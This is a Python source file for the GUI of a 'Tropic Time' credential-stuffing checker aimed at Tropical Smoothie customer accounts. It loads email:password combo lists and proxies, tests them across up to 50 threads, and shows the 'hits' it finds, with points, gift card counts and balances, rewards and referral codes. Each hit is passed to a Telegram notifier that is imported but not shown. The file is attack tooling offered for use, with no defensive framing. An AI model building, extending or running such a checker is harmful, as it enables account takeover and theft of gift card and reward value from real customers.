"""Tropical Smoothie themed checker GUI."""

from __future__ import annotations

import threading
import tkinter as tk
from pathlib import Path
from tkinter import filedialog, messagebox
from typing import Any

import customtkinter as ctk

from .api import AccountResult, parse_combo_line
from .engine import CheckerEngine, CheckerStats
from . import storage
from . import theme as T

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")


class TropicCheckerApp(ctk.CTk):
    def __init__(self) -> None:
        super().__init__()
        self.config = storage.load_config()
        self.title(T.APP_TITLE)
        self.geometry(self.config.get("window_geometry", "1200x780"))
        self.minsize(1000, 650)
        self.configure(fg_color=T.PANEL)

        self.combos: list[tuple[str, str]] = []
        self.proxies: list[str] = []
        self.hits: list[str] = []
        self.hit_results: list[AccountResult] = []
        self.engine: CheckerEngine | None = None
        self.worker: threading.Thread | None = None
        self._hit_cards: list[ctk.CTkFrame] = []
        self.progress = storage.ProgressTracker(storage.DATA_DIR)

        self._build_ui()
        self._load_saved_data()
        self.protocol("WM_DELETE_WINDOW", self._on_close)

    def _build_ui(self) -> None:
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self._build_sidebar()
        self._build_main_area()

    def _build_sidebar(self) -> None:
        sidebar = ctk.CTkFrame(self, width=320, corner_radius=0, fg_color=T.PANEL_LIGHT)
        sidebar.grid(row=0, column=0, sticky="nsew")
        sidebar.grid_propagate(False)

        header = ctk.CTkFrame(sidebar, fg_color="transparent")
        header.pack(fill="x", padx=20, pady=(24, 8))
        ctk.CTkLabel(
            header,
            text="🌴 Tropic Time",
            font=T.FONT_TITLE,
            text_color=T.PINK,
        ).pack(anchor="w")
        ctk.CTkLabel(
            header,
            text=T.APP_SUBTITLE,
            font=T.FONT_SMALL,
            text_color=T.TEXT_DIM,
            wraplength=280,
            justify="left",
        ).pack(anchor="w", pady=(4, 0))

        self._section(sidebar, "Combo List")
        combo_row = ctk.CTkFrame(sidebar, fg_color="transparent")
        combo_row.pack(fill="x", padx=16, pady=(0, 4))
        self.combo_path_var = tk.StringVar(value=self.config.get("combo_path", ""))
        ctk.CTkEntry(combo_row, textvariable=self.combo_path_var, font=T.FONT_SMALL).pack(
            side="left", fill="x", expand=True, padx=(0, 6)
        )
        ctk.CTkButton(
            combo_row, text="Browse", width=70, fg_color=T.PINK, hover_color=T.PINK_HOVER,
            command=self._browse_combos,
        ).pack(side="right")

        combo_btns = ctk.CTkFrame(sidebar, fg_color="transparent")
        combo_btns.pack(fill="x", padx=16, pady=4)
        ctk.CTkButton(
            combo_btns, text="Load Combos", fg_color=T.MINT, hover_color=T.LIME, text_color="#111",
            command=self._load_combos,
        ).pack(side="left", fill="x", expand=True, padx=(0, 4))
        ctk.CTkButton(
            combo_btns, text="Save Remaining", fg_color=T.CARD, hover_color=T.BORDER,
            command=self._save_remaining_combos,
        ).pack(side="left", fill="x", expand=True)

        self.combo_count_label = ctk.CTkLabel(
            sidebar, text="Combos loaded: 0", font=T.FONT_SMALL, text_color=T.TEXT_DIM,
        )
        self.combo_count_label.pack(anchor="w", padx=20, pady=(0, 12))

        self._section(sidebar, "Proxies")
        proxy_row = ctk.CTkFrame(sidebar, fg_color="transparent")
        proxy_row.pack(fill="x", padx=16, pady=(0, 4))
        self.proxy_path_var = tk.StringVar(value=self.config.get("proxy_path", ""))
        ctk.CTkEntry(proxy_row, textvariable=self.proxy_path_var, font=T.FONT_SMALL).pack(
            side="left", fill="x", expand=True, padx=(0, 6)
        )
        ctk.CTkButton(
            proxy_row, text="Browse", width=70, fg_color=T.PINK, hover_color=T.PINK_HOVER,
            command=self._browse_proxies,
        ).pack(side="right")

        proxy_btns = ctk.CTkFrame(sidebar, fg_color="transparent")
        proxy_btns.pack(fill="x", padx=16, pady=4)
        ctk.CTkButton(
            proxy_btns, text="Load Proxies", fg_color=T.MINT, hover_color=T.LIME, text_color="#111",
            command=self._load_proxies,
        ).pack(side="left", fill="x", expand=True, padx=(0, 4))
        ctk.CTkButton(
            proxy_btns, text="Save Proxies", fg_color=T.CARD, hover_color=T.BORDER,
            command=self._save_proxies,
        ).pack(side="left", fill="x", expand=True)

        self.proxy_count_label = ctk.CTkLabel(
            sidebar, text="Proxies loaded: 0", font=T.FONT_SMALL, text_color=T.TEXT_DIM,
        )
        self.proxy_count_label.pack(anchor="w", padx=20, pady=(0, 12))

        self._section(sidebar, "Settings")
        thread_row = ctk.CTkFrame(sidebar, fg_color="transparent")
        thread_row.pack(fill="x", padx=16, pady=4)
        ctk.CTkLabel(thread_row, text="Threads", font=T.FONT_BODY).pack(side="left")
        self.thread_var = tk.IntVar(value=int(self.config.get("threads", 5)))
        ctk.CTkSlider(
            thread_row, from_=1, to=50, number_of_steps=49, variable=self.thread_var,
            progress_color=T.PINK, button_color=T.PINK, button_hover_color=T.PINK_HOVER,
        ).pack(side="right", fill="x", expand=True, padx=(12, 0))
        self.thread_label = ctk.CTkLabel(
            sidebar, text=f"Threads: {self.thread_var.get()}", font=T.FONT_SMALL, text_color=T.TEXT_DIM,
        )
        self.thread_label.pack(anchor="w", padx=20)
        self.thread_var.trace_add("write", self._on_thread_change)

        action_row = ctk.CTkFrame(sidebar, fg_color="transparent")
        action_row.pack(fill="x", padx=16, pady=(20, 8))
        self.start_btn = ctk.CTkButton(
            action_row, text="▶  START CHECKING", height=42,
            font=("Segoe UI", 14, "bold"), fg_color=T.PINK, hover_color=T.PINK_HOVER,
            command=self._start_checking,
        )
        self.start_btn.pack(fill="x", pady=(0, 6))
        self.stop_btn = ctk.CTkButton(
            action_row, text="■  STOP", height=36, fg_color=T.FAIL_RED, hover_color="#CC3333",
            command=self._stop_checking, state="disabled",
        )
        self.stop_btn.pack(fill="x")

        self._section(sidebar, "Stats")
        stats_frame = ctk.CTkFrame(sidebar, fg_color=T.CARD, corner_radius=12)
        stats_frame.pack(fill="x", padx=16, pady=8)
        self.stat_labels: dict[str, ctk.CTkLabel] = {}
        for key, label in [
            ("total", "Total"),
            ("checked", "Checked"),
            ("hits", "Hits"),
            ("fails", "Fails"),
            ("cpm", "CPM"),
        ]:
            row = ctk.CTkFrame(stats_frame, fg_color="transparent")
            row.pack(fill="x", padx=12, pady=4)
            ctk.CTkLabel(row, text=label, font=T.FONT_BODY, text_color=T.TEXT_DIM).pack(side="left")
            lbl = ctk.CTkLabel(row, text="0", font=T.FONT_HEADING, text_color=T.MINT)
            lbl.pack(side="right")
            self.stat_labels[key] = lbl

        ctk.CTkLabel(
            sidebar,
            text="Data saved to ~/.tropic-checker/",
            font=T.FONT_SMALL,
            text_color=T.TEXT_DIM,
        ).pack(side="bottom", pady=12)

    def _build_main_area(self) -> None:
        main = ctk.CTkFrame(self, fg_color=T.PANEL)
        main.grid(row=0, column=1, sticky="nsew", padx=(0, 0), pady=0)
        main.grid_rowconfigure(1, weight=1)
        main.grid_columnconfigure(0, weight=1)

        hits_header = ctk.CTkFrame(main, fg_color="transparent")
        hits_header.grid(row=0, column=0, sticky="ew", padx=20, pady=(20, 8))
        ctk.CTkLabel(
            hits_header, text="🍹 Hits", font=T.FONT_HEADING, text_color=T.SUN,
        ).pack(side="left")
        ctk.CTkButton(
            hits_header, text="Copy All Hits", width=110, fg_color=T.CARD, hover_color=T.BORDER,
            command=self._copy_all_hits,
        ).pack(side="right", padx=(6, 0))
        ctk.CTkButton(
            hits_header, text="Clear All Hits", width=110, fg_color=T.CARD, hover_color=T.BORDER,
            command=self._clear_all_hits,
        ).pack(side="right", padx=(6, 0))
        ctk.CTkButton(
            hits_header, text="Save Hits", width=90, fg_color=T.CARD, hover_color=T.BORDER,
            command=self._save_hits_file,
        ).pack(side="right")

        self.hits_scroll = ctk.CTkScrollableFrame(
            main, fg_color=T.PANEL_LIGHT, corner_radius=12,
        )
        self.hits_scroll.grid(row=1, column=0, sticky="nsew", padx=20, pady=(0, 8))
        self.hits_scroll.grid_columnconfigure(0, weight=1)
        self._show_empty_hits()

        log_header = ctk.CTkFrame(main, fg_color="transparent")
        log_header.grid(row=2, column=0, sticky="ew", padx=20, pady=(0, 4))
        ctk.CTkLabel(
            log_header, text="Activity Log", font=T.FONT_BODY, text_color=T.TEXT_DIM,
        ).pack(side="left")
        ctk.CTkButton(
            log_header, text="Clear Log", width=80, height=24, fg_color=T.CARD, hover_color=T.BORDER,
            command=self._clear_log,
        ).pack(side="right")

        self.log_box = ctk.CTkTextbox(
            main, height=140, font=T.FONT_MONO, fg_color=T.CARD, text_color=T.TEXT_DIM,
            corner_radius=12,
        )
        self.log_box.grid(row=3, column=0, sticky="ew", padx=20, pady=(0, 20))
        self.log_box.configure(state="disabled")

    def _section(self, parent: ctk.CTkFrame, title: str) -> None:
        ctk.CTkLabel(
            parent, text=title.upper(), font=("Segoe UI", 11, "bold"), text_color=T.PINK,
        ).pack(anchor="w", padx=20, pady=(16, 6))

    def _show_empty_hits(self) -> None:
        for w in self.hits_scroll.winfo_children():
            w.destroy()
        self._hit_cards.clear()
        ctk.CTkLabel(
            self.hits_scroll,
            text="No hits yet — load combos and press START CHECKING",
            font=T.FONT_BODY,
            text_color=T.TEXT_DIM,
        ).pack(pady=40)

    def _load_saved_data(self) -> None:
        storage.ensure_dirs()
        combo_path = self.combo_path_var.get()
        proxy_path = self.proxy_path_var.get()
        if Path(combo_path).exists():
            self.combos = storage.load_combos(combo_path)
            self.progress.set_remaining_count(len(self.combos))
        if Path(proxy_path).exists():
            self.proxies = storage.load_proxies(proxy_path)
        hits_path = self.config.get("hits_path", str(storage.HITS_PATH))
        self.hits = storage.load_hits(hits_path)
        self._refresh_counts()
        self._rebuild_hit_cards_from_lines()

    def _refresh_counts(self) -> None:
        checked = self.progress.checked_count()
        if checked:
            self.combo_count_label.configure(
                text=f"Combos: {len(self.combos)} remaining ({checked} checked)"
            )
        else:
            self.combo_count_label.configure(text=f"Combos loaded: {len(self.combos)}")
        self.proxy_count_label.configure(text=f"Proxies loaded: {len(self.proxies)}")

    def _on_thread_change(self, *_args: Any) -> None:
        self.thread_label.configure(text=f"Threads: {self.thread_var.get()}")

    def _browse_combos(self) -> None:
        path = filedialog.askopenfilename(
            title="Select combo file",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
        )
        if path:
            self.combo_path_var.set(path)

    def _browse_proxies(self) -> None:
        path = filedialog.askopenfilename(
            title="Select proxy file",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
        )
        if path:
            self.proxy_path_var.set(path)

    def _load_combos(self) -> None:
        path = self.combo_path_var.get().strip()
        if not path:
            messagebox.showwarning("Combo File", "Select a combo file path first.")
            return
        parsed = storage.load_combos(path)
        previous = list(self.combos)
        self.combos, skipped, message = self.progress.merge_reload(parsed, previous)
        storage.save_combos(path, self.combos)
        self.progress.set_remaining_count(len(self.combos))
        self._refresh_counts()
        if message:
            self._log(message)
        self._log(
            f"Loaded {len(self.combos)} combos from {path} "
            f"({self.progress.checked_count()} already checked)"
        )
        self._persist_config()

    def _save_remaining_combos(self) -> None:
        path = self.combo_path_var.get().strip()
        if not path:
            messagebox.showwarning("Combo File", "Select a combo file path first.")
            return
        storage.save_combos(path, self.combos)
        self._log(f"Saved {len(self.combos)} remaining combos to {path}")
        messagebox.showinfo("Saved", f"Saved {len(self.combos)} combos.")

    def _load_proxies(self) -> None:
        path = self.proxy_path_var.get().strip()
        if not path:
            messagebox.showwarning("Proxy File", "Select a proxy file path first.")
            return
        self.proxies = storage.load_proxies(path)
        self._refresh_counts()
        self._log(f"Loaded {len(self.proxies)} proxies from {path}")
        self._persist_config()

    def _save_proxies(self) -> None:
        path = self.proxy_path_var.get().strip()
        if not path:
            messagebox.showwarning("Proxy File", "Select a proxy file path first.")
            return
        storage.save_proxies(path, self.proxies)
        self._log(f"Saved {len(self.proxies)} proxies to {path}")
        messagebox.showinfo("Saved", f"Saved {len(self.proxies)} proxies.")

    def _save_hits_file(self) -> None:
        path = self.config.get("hits_path", str(storage.HITS_PATH))
        storage.save_hits(path, self.hits)
        self._log(f"Saved {len(self.hits)} hits to {path}")
        messagebox.showinfo("Saved", f"Saved {len(self.hits)} hits.")

    def _persist_config(self) -> None:
        self.config.update(
            {
                "combo_path": self.combo_path_var.get(),
                "proxy_path": self.proxy_path_var.get(),
                "threads": self.thread_var.get(),
                "window_geometry": self.geometry(),
            }
        )
        storage.save_config(self.config)

    def _log(self, message: str) -> None:
        def _append() -> None:
            self.log_box.configure(state="normal")
            self.log_box.insert("end", message + "\n")
            self.log_box.see("end")
            self.log_box.configure(state="disabled")

        self.after(0, _append)

    def _clear_log(self) -> None:
        self.log_box.configure(state="normal")
        self.log_box.delete("1.0", "end")
        self.log_box.configure(state="disabled")

    def _update_stats(self, stats: CheckerStats) -> None:
        def _set() -> None:
            self.stat_labels["total"].configure(text=str(stats.total))
            self.stat_labels["checked"].configure(text=str(stats.checked_total))
            self.stat_labels["hits"].configure(text=str(stats.hits_total))
            self.stat_labels["fails"].configure(text=str(stats.fails_total))
            self.stat_labels["cpm"].configure(text=f"{stats.cpm:.1f}")

        self.after(0, _set)

    def _add_hit_card(self, result: AccountResult) -> None:
        def _build() -> None:
            if not self._hit_cards and self.hits_scroll.winfo_children():
                for w in self.hits_scroll.winfo_children():
                    w.destroy()

            card = ctk.CTkFrame(self.hits_scroll, fg_color=T.CARD, corner_radius=12, border_width=1, border_color=T.BORDER)
            card.pack(fill="x", padx=8, pady=6)
            card.grid_columnconfigure(0, weight=1)
            self._hit_cards.append(card)

            top = ctk.CTkFrame(card, fg_color="transparent")
            top.pack(fill="x", padx=14, pady=(12, 4))
            title = result.display_name or result.email
            ctk.CTkLabel(
                top, text=f"🌴 HIT — {title}", font=T.FONT_HEADING, text_color=T.HIT_GREEN,
            ).pack(side="left")

            ctk.CTkLabel(
                card, text=result.combo, font=T.FONT_MONO, text_color=T.SUN,
            ).pack(anchor="w", padx=14, pady=(0, 6))

            details = []
            details.append(f"Points: {result.points or 0}")
            details.append(f"Gift Cards: {len(result.gift_cards)}")
            if result.gift_card_balance:
                details.append(f"GC Balance: ${result.gift_card_balance:.2f}")
            details.append(f"Rewards: {len(result.rewards)}")
            if result.profile and result.profile.get("referral_code"):
                details.append(f"Referral: {result.profile['referral_code']}")
            ctk.CTkLabel(
                card, text="  •  ".join(details), font=T.FONT_BODY, text_color=T.TEXT,
            ).pack(anchor="w", padx=14, pady=(0, 4))

            if result.rewards:
                reward_text = "\n".join(
                    f"  ↳ {r.get('name', 'Reward')} (exp {r.get('expiring_at', '?')})"
                    for r in result.rewards[:5]
                )
                ctk.CTkLabel(
                    card, text=reward_text, font=T.FONT_SMALL, text_color=T.MINT, justify="left",
                ).pack(anchor="w", padx=14, pady=(0, 4))

            if result.gift_cards:
                gc_text = "\n".join(
                    f"  💳 {json_card_summary(gc)}" for gc in result.gift_cards[:5]
                )
                ctk.CTkLabel(
                    card, text=gc_text, font=T.FONT_SMALL, text_color=T.LIME, justify="left",
                ).pack(anchor="w", padx=14, pady=(0, 4))

            btns = ctk.CTkFrame(card, fg_color="transparent")
            btns.pack(fill="x", padx=14, pady=(4, 12))
            ctk.CTkButton(
                btns, text="Copy Hit", width=90, height=28, fg_color=T.PINK, hover_color=T.PINK_HOVER,
                command=lambda r=result: self._copy_text(r.summary_line()),
            ).pack(side="left", padx=(0, 6))
            ctk.CTkButton(
                btns, text="Copy Combo", width=100, height=28, fg_color=T.MINT, hover_color=T.LIME, text_color="#111",
                command=lambda r=result: self._copy_text(r.combo),
            ).pack(side="left", padx=(0, 6))
            ctk.CTkButton(
                btns, text="Delete", width=80, height=28, fg_color=T.FAIL_RED, hover_color="#CC3333",
                command=lambda r=result, c=card: self._delete_hit(r, c),
            ).pack(side="left")

        self.after(0, _build)

    def _rebuild_hit_cards_from_lines(self) -> None:
        if not self.hits:
            return
        for w in self.hits_scroll.winfo_children():
            w.destroy()
        self._hit_cards.clear()
        for line in reversed(self.hits):
            result = line_to_result(line)
            if result:
                self.hit_results.append(result)
                self._add_hit_card(result)

    def _copy_text(self, text: str) -> None:
        self.clipboard_clear()
        self.clipboard_append(text)
        self._log("Copied to clipboard")

    def _copy_all_hits(self) -> None:
        if not self.hits:
            messagebox.showinfo("Copy", "No hits to copy.")
            return
        self._copy_text("\n".join(self.hits))

    def _delete_hit(self, result: AccountResult, card: ctk.CTkFrame) -> None:
        line = result.summary_line()
        if line in self.hits:
            self.hits.remove(line)
        if result in self.hit_results:
            self.hit_results.remove(result)
        card.destroy()
        if card in self._hit_cards:
            self._hit_cards.remove(card)
        path = self.config.get("hits_path", str(storage.HITS_PATH))
        storage.save_hits(path, self.hits)
        self._log(f"Deleted hit: {result.email}")
        if not self._hit_cards:
            self._show_empty_hits()

    def _clear_all_hits(self) -> None:
        if not self.hits and not self._hit_cards:
            return
        if not messagebox.askyesno("Clear Hits", "Delete all hits?"):
            return
        self.hits.clear()
        self.hit_results.clear()
        path = self.config.get("hits_path", str(storage.HITS_PATH))
        storage.save_hits(path, self.hits)
        self._show_empty_hits()
        self._log("Cleared all hits")

    def _remove_combo(self, result: AccountResult) -> None:
        combo = (result.email, result.password)
        if combo in self.combos:
            self.combos.remove(combo)

    def _mark_checked(self, result: AccountResult) -> None:
        self.progress.mark_checked(result.email, result.password, success=result.success)
        self.progress.set_remaining_count(len(self.combos))

    def _on_hit(self, result: AccountResult) -> None:
        from .telegram_notify import notify_gift_card_hit

        self._remove_combo(result)
        self._mark_checked(result)
        line = result.summary_line()
        self.hits.insert(0, line)
        self.hit_results.insert(0, result)
        path = self.config.get("hits_path", str(storage.HITS_PATH))
        storage.append_hit(path, result)
        self._add_hit_card(result)
        notify_gift_card_hit(result)

    def _on_fail(self, result: AccountResult) -> None:
        self._remove_combo(result)
        self._mark_checked(result)

    def _start_checking(self) -> None:
        if self.worker and self.worker.is_alive():
            return
        if not self.combos:
            self._load_combos()
        if not self.combos:
            messagebox.showwarning("No Combos", "Load a combo file with email:password lines.")
            return

        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self._persist_config()

        combos_snapshot = list(self.combos)
        checked_baseline = self.progress.checked_count()
        self.engine = CheckerEngine(
            combos=combos_snapshot,
            proxies=self.proxies,
            threads=self.thread_var.get(),
            on_hit=self._on_hit,
            on_fail=self._on_fail,
            on_progress=self._update_stats,
            on_log=self._log,
        )
        self.engine.stats = CheckerStats(
            total=len(combos_snapshot) + checked_baseline,
            checked_baseline=checked_baseline,
            hits_baseline=self.progress.hits_count(),
            fails_baseline=self.progress.fails_count(),
        )
        if checked_baseline:
            self._log(
                f"Resuming at {checked_baseline} checked, {len(combos_snapshot)} remaining"
            )

        def run() -> None:
            self.engine.run()
            self.after(0, self._on_check_done)

        self.worker = threading.Thread(target=run, daemon=True)
        self.worker.start()

    def _stop_checking(self) -> None:
        if self.engine:
            self.engine.stop()
            self._log("Stop requested...")
            self.stop_btn.configure(state="disabled")

    def _on_check_done(self) -> None:
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        remaining_path = self.combo_path_var.get().strip()
        if remaining_path:
            storage.save_combos(remaining_path, self.combos)
            self._log(f"Auto-saved {len(self.combos)} remaining combos")
        self._refresh_counts()
        self._persist_config()

    def _on_close(self) -> None:
        if self.engine:
            self.engine.stop()
        self._persist_config()
        self.destroy()


def json_card_summary(card: dict[str, Any]) -> str:
    from .api import format_gift_card

    return format_gift_card(card)


def line_to_result(line: str) -> AccountResult | None:
    line = line.strip()
    if not line:
        return None
    combo_part = line.split(" | ")[0].strip()
    parsed = parse_combo_line(combo_part)
    if not parsed:
        return None
    email, password = parsed
    result = AccountResult(email=email, password=password, success=True)
    for segment in line.split(" | ")[1:]:
        if segment.startswith("Name="):
            result.profile = {"first_name": segment[5:], "last_name": ""}
        elif segment.startswith("Points="):
            try:
                result.points = int(segment.split("=", 1)[1])
            except ValueError:
                pass
        elif segment.startswith("GiftCards="):
            try:
                count = int(segment.split("=", 1)[1])
                result.gift_cards = [{}] * count
            except ValueError:
                pass
        elif segment.startswith("Rewards="):
            try:
                int(segment.split("=", 1)[1])
            except ValueError:
                pass
    return result


def run_app() -> None:
    app = TropicCheckerApp()
    app.mainloop()
